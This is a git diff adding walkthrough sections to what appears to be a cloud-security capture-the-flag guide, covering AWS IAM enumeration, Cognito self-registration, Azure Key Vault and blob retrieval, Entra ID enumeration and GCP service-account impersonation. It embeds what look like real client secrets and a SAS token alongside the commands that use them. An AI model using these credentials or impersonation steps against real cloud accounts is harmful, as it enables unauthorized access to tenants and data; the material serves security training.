@@ -49,6 +49,7 @@ $res = Get-MgServicePrincipal -Filter "DisplayName eq 'Microsoft Graph'"
 $res.AppRoles | Where-Object { $_.Id -eq '9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30' } | ConvertTo-Json
 ```
 
+---
 ## Who Am IAM?
 ### Step 1: Configure AWS CLI with Given Credentials
 ```sh
@@ -140,6 +141,8 @@ pip install -r requirements.txt
 #Discovered a set of AWS credentials but unsure of their permissions?
 python enumerate-iam.py --access-key <AKIA....> --secret-key <15H72mm...>
 ```
+
+---
 ## Trust Me, Relationship is Malicious
 ### 1. Configure AWS CLI with Given Credentials
 ```
@@ -178,6 +181,8 @@ aws s3 ls s3://securecorpbakstoragebuk/ --recursive --profile Role
 aws s3api get-object --bucket securecorpbakstoragebuk --key docs/Flag.txt flag.txt --profile Role
 
 ```
+
+---
 ## IAM Access Compass (gcloud)
 ### 1. authenticate with the given credentials
 ```sh
@@ -230,6 +235,213 @@ python3 enumerate_member_permissions.py --project-id woven-acolyte-428406-v9 #pa
 
 python3 check_for_privesc.py
 ```
+
+---
+## Enumerating Cognito
+### **Step:01**
+First let’s visit the provided URL & click on the Job Portal Login button.
+### **Step:02**
+After the redirection to the Cognito URL, copy the Client ID and open AWS CLI
+### **Step 3**
+In the AWS CLI run the following command to register a new user
+```sh
+aws cognito-idp sign-up \
+  --region ap-south-1 \
+  --client-id 6h6b6gvm11k0eis3l4vhkhgi67 \
+  --username testtt \
+  --password testasdfaADSfa34 \
+  --user-attributes '[{"Name":"email","Value":"a@s31frc3.ru"}]'
+```
+### **Step 4**
+Check the email address and the TO ADDRESS is the flag.
+
+---
+## simulate-principal-policy Mirage
+### Step 1: Configure AWS CLI with Given Credentials
+```
+aws configure
+aws sts get-caller-identity 
+```
+### Step 2: Create a Permission List
+```
+ec2:StartInstances
+s3:ListBucket
+iam:CreateUser
+```
+### Step 3: Enumerate IAM Permissions
+```sh
+#!/bin/bash
+
+PRINCIPAL_ARN="arn:aws:iam::058264439561:user/DevAppUser"
+
+while read -r permission; do
+    [[ -z "$permission" ]] && continue
+
+    echo "Permission: $permission"
+    
+    aws iam simulate-principal-policy \
+        --policy-source-arn "$PRINCIPAL_ARN" \
+        --action-names "$permission" \
+
+    echo -e "\n"
+done < policy.txt
+```
+
+---
+
+## Vaulted Keys and Hidden Blobs
+### Step 1: Discover the Tenant ID
+```
+https://login.microsoftonline.com/secure-corp.org/.well-known/openid-configuration
+
+f2a33211-e46a-4c92-b84d-aff06c2cd13f
+```
+### Step 2: Authenticate with Azure
+```sh
+az login --service-principal -u 76e1a895-1f05-4165-83ab-98eed07bed86 -p 6LU8Q~OjXfR3z8ZTOHqd0MpE8r1bGs0qStavaacZ --tenant f2a33211-e46a-4c92-b84d-aff06c2cd13f
+```
+### Step 3: Enumerate Role Assignments
+```sh
+az role assignment list --assignee 76e1a895-1f05-4165-83ab-98eed07bed86 --output json --all
+```
+### Step 4: Locate the Key Vault & Retrieve Secrets
+```sh
+#To list the KeyVault in your Subscription
+az keyvault list --resource-group DataBack-RG
+
+#To list the KeyVault in your Resource Group
+az keyvault list --subscription 662a4fee-a3ba-49b3-9caf-8c20ed04503f
+
+#Once we get the KeyVault name, try to get the secrets:
+az keyvault secret list --vault-name secopprobackkv
+az keyvault secret show --name secopprobacksaSAASToken --vault-name secopprobackkv
+```
+### Step 5: Retrieve Storage details
+```sh
+az storage container list --account-name secopprobacksa --sas-token "sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=0t6AaxsrIAHeqdwok%2FFq4xtviXOHLrwQfvdMWTG2zKE%3D" --output table
+
+#This command will help you to list all the containers within that storage account.
+az storage blob list --account-name secopprobacksa --container-name secopprobacksc --sas-token "sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=0t6AaxsrIAHeqdwok%2FFq4xtviXOHLrwQfvdMWTG2zKE%3D" --output table
+
+az storage blob download --account-name secopprobacksa --container-name secopprobacksc --name Flag.txt --file Flag.txt --sas-token "sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=0t6AaxsrIAHeqdwok%2FFq4xtviXOHLrwQfvdMWTG2zKE%3D" --output table
+```
+## Service Account Impersonation Odyssey
+### Step 1: Authenticate to GCP
+```sh
+gcloud auth activate-service-account --key-file GCPChallengeCredentials.json
+
+Activated service account credentials for: [hd-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com]
+```
+### Step 2: List Projects
+```sh
+gcloud projects list
+
+PROJECT_ID               NAME  PROJECT_NUMBER  ENVIRONMENT
+woven-acolyte-428406-v9  Prod  129668539536
+```
+### Step 3: Identify Permissions of Your Service Account
+```sh
+gcloud projects get-iam-policy woven-acolyte-428406-v9 --flatten="bindings[].members" --filter="bindings.members:serviceAccount:hd-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com" --format='table(bindings.role)'
+
+ROLE
+roles/iam.serviceAccountViewer
+roles/viewer
+```
+### Step 4: Enumerate Other Service Accounts
+```sh
+gcloud iam service-accounts list --project woven-acolyte-428406-v9
+```
+### Step 5: Check Permissions for Another Service Account
+```sh
+gcloud iam service-accounts get-iam-policy func-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com --project woven-acolyte-428406-v9
+```
+### Step 6: Investigate Cloud Functions
+```sh
+gcloud functions list --project woven-acolyte-428406-v9
+```
+### Step 7: Investigate Cloud Function IAM Policies
+```sh
+# To get the policy attached to the function
+gcloud functions get-iam-policy secops-function --project woven-acolyte-428406-v9
+
+# To get the details of role
+gcloud iam roles describe customEditorNoDelete --project woven-acolyte-428406-v9
+```
+### Step 8: Exploit Service Account Impersonation
+**Approach-1: Using Impersonation**
+```sh
+gcloud functions call secops-function --project woven-acolyte-428406-v9 --impersonate-service-account func-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com
+```
+**Approach-2: Using access token**
+```sh
+gcloud auth print-access-token --impersonate-service-account=func-service-account@woven-acolyte-428406-v9.iam.gserviceaccount.com
+
+gcloud functions call secops-function --project woven-acolyte-428406-v9 --access-token-file token.txt
+```
+## EntraID Permission Atlas
+### Step 1: Authenticate to Azure
+```sh
+curl -X POST -H "Content-Type: application/x-www-form-urlencoded" \
+-d "client_id=caaa28c5-b8da-4d29-b42e-95b1aba6b81c" \
+-d "scope=https://graph.microsoft.com/.default" \
+-d "client_secret=bXj8Q~_v1Y.hArjCqwQBUhCE-MwAvqB_Q1AcAa-V" \
+-d "grant_type=client_credentials" \
+https://login.microsoftonline.com/f2a33211-e46a-4c92-b84d-aff06c2cd13f/oauth2/v2.0/token
+
+#or like this
+az login --service-principal -u e8086d7e-9304-4597-a447-e68721ea45a8 -p RvL8Q~8Y3U1x14FNVNzn3hJC~M119m~9Rp3K-aFx --tenant f2a33211-e46a-4c92-b84d-aff06c2cd13f
+```
+### Step 2: Enumerate Users, Groups & Applications
+```sh
+#To list the Users
+az ad user list --query '[].{User:displayName, UPN:userPrincipalName, ObjectId:objectId}'
+
+#List all groups:
+az ad group list --query '[].{Name:displayName, ObjectId:objectId}' --output table
+
+#To list the Applications (App Registrations)
+az ad app list --query '[].{AppName:displayName, AppId:appId, ObjectId:objectId}'
+
+#To list the Service Principals
+az ad sp list --query '[].{SPName:displayName, AppId:appId, ObjectId:objectId}'
+```
+### Step 3: Investigate IAM Roles & Permissions
+```sh
+#To get the roles assigned with the users
+az role assignment list --assignee 'user_principal_name' --all
+
+#To get the role assigned with the service principls
+az role assignment list --assignee <ServicePrincipalObjectId> --query '[].{Role:roleDefinitionName, Scope:scope}'
+
+#To get the role definition
+az role definition list --query '[].{RoleName:roleName, Id:id}' --output table
+```
+### Step 4: Identify the App Registration Owner
+```sh
+#To get the details about application permission
+az ad app show --id <ApplicationId> --query "requiredResourceAccess"
+
+#To get the details of App Role of Application (App Registration)
+az ad app show --id 84a6fe6a-2642-4832-b0d1-f8e0c4cad633 --query "appRoles"
+
+#To know who is the owner of App Registration
+az ad app owner list --id <AppObjectId> --query '[].{OwnerName:displayName, OwnerUPN:userPrincipalName}'
+
+#To know who is the owner of App Registration using Mggraph
+Get-MgApplicationOwner -ApplicationId "84a6fe6a-2642-4832-b0d1-f8e0c4cad633" | ConvertTo-Json
+```
+### Automated Tool - MicroBurst
+```
+github.com/NetSPI/MicroBurst
+```
+## Service Principals Permission Paradox
+
+
+
+
+
+
+
 
 # Defensive
 ## User Account Creation Alchemy
